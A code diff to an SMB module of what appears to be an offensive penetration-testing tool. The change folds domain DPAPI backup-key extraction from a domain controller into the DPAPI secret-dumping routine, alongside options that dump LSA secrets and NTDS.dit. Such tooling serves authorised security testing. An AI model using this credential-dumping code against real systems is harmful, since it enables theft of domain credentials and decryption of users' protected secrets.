@@ -172,7 +172,6 @@ class smb(connection):
         cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
         cegroup.add_argument("--ntds", choices={'vss', 'drsuapi'}, nargs='?', const='drsuapi', help="dump the NTDS.dit from target DCs using the specifed method\n(default: drsuapi)")
         cegroup.add_argument("--dpapi", action='store_true', help='dump DPAPI secrets from target systems')
-        cegroup.add_argument("--dump-pvk", action='store_true', help='DPAPI option. Dump domain backupkey on domain controller')
         #cgroup.add_argument("--ntds-history", action='store_true', help='Dump NTDS.dit password history')
         #cgroup.add_argument("--ntds-pwdLastSet", action='store_true', help='Shows the pwdLastSet attribute for each NTDS.dit account')
 
@@ -1171,6 +1170,42 @@ class smb(connection):
 
     @requires_admin
     def dpapi(self):
+
+        pvkbytes = None
+        if self.args.pvk is not None:
+            try:
+                pvkbytes = open(self.args.pvk, 'rb').read()
+            except Exception as e:
+                logging.error(str(e))
+
+        masterkeys = []
+        if self.args.mkfile is not None:
+            try:
+                masterkeys += parse_masterkey_file(self.args.mkfile)
+            except Exception as e:
+                self.logger.error(str(e))
+
+        if pvkbytes is None:
+            dc_target = Target.create(
+                domain=self.domain,
+                username=self.username,
+                password=self.password,
+                target=self.domain,
+                lmhash=self.lmhash,
+                nthash=self.nthash,
+                do_kerberos=self.kerberos,
+                aesKey=self.aesKey,
+                use_kcache=self.use_kcache,
+            )
+
+            dc_conn = DPLootSMBConnection(dc_target) 
+            dc_conn.connect() # Connect to DC
+            if dc_conn.is_admin:
+                self.logger.info("User is Domain Administrator, exporting domain backupkey...")
+                backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
+                backupkey = backupkey_triage.triage_backupkey()
+                pvkbytes = backupkey.backupkey_v2
+
         target = Target.create(
             domain=self.domain,
             username=self.username,
@@ -1186,19 +1221,7 @@ class smb(connection):
         conn = DPLootSMBConnection(target) 
         conn.connect()
 
-        pvkbytes = None
-        if self.args.pvk is not None:
-            try:
-                pvkbytes = open(self.args.pvk, 'rb').read()
-            except Exception as e:
-                logging.error(str(e))
-
-        masterkeys = []
-        if self.args.mkfile is not None:
-            try:
-                masterkeys += parse_masterkey_file(self.args.mkfile)
-            except Exception as e:
-                self.logger.error(str(e))
+        
 
         self.logger.info("Gathering masterkeys")
 
@@ -1286,30 +1309,6 @@ class smb(connection):
                 logging.debug("Error calling remote_ops.finish(): {}".format(e))
 
             LSA.finish()
-
-    @requires_admin
-    def dump_pvk(self):
-        target = Target.create(
-            domain=self.domain,
-            username=self.username,
-            password=self.password,
-            target=self.host,
-            lmhash=self.lmhash,
-            nthash=self.nthash,
-            do_kerberos=self.kerberos,
-            aesKey=self.aesKey,
-            use_kcache=self.use_kcache,
-        )
-
-        conn = DPLootSMBConnection(target) 
-        conn.connect() # Connect to DC
-
-        self.logger.info("Downloading Domain Backupkey")
-        backupkey_triage = BackupkeyTriage(target=target, conn=conn)
-        backupkey = backupkey_triage.triage_backupkey()
-        outputfile = '%s.pvk' % self.domain
-        open(outputfile, 'wb').write(backupkey.backupkey_v2)
-        self.logger.success("Domain backupkey exported to file {}".format(outputfile ))
 
     def ntds(self):
         self.enable_remoteops()
